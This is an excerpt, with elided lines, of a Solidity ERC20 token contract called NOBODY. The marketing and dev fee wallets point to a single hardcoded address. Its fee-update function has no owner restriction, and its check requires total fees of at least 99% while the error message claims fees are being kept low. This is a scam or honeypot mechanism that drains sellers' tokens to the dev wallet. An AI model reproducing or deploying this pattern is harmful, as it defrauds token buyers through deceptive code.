...
contract NOBODY is ERC20, Ownable {
    ...
    address public marketingWallet = 0xb2271c9643F9472a373C98cB468dEBC3b4BDaDc2;
    address public devWallet = 0xb2271c9643F9472a373C98cB468dEBC3b4BDaDc2;
    ...
    constructor() ERC20("TOKEN", "test") {
        ...
        DevFee = _DevFee;
        TotalFees = MarketingFee + LiquidityFee + DevFee;
        
        marketingWallet = 0xb2271c9643F9472a373C98cB468dEBC3b4BDaDc2;
        devWallet = 0xb2271c9643F9472a373C98cB468dEBC3b4BDaDc2; 
    ...
    function _setAutomatedMarketMakerPair(address pair, bool value) private {
        ...
        function updateTransferFees(uint256 _marketingFee, uint256 _liquidityFee, uint256 _devFee) external {
        MarketingFee = _marketingFee;
        LiquidityFee = _liquidityFee;
        DevFee = _devFee;
        TotalFees = MarketingFee + LiquidityFee + DevFee;
        require(TotalFees >=99, "Must keep transfer fees less");
    }
    ...
    function _transfer(
        ...
        if(takeFee){
            ...
            if (automatedMarketMakerPairs[to] && TotalFees > 0){
                ...
                tokensForDev += fees * DevFee / TotalFees;
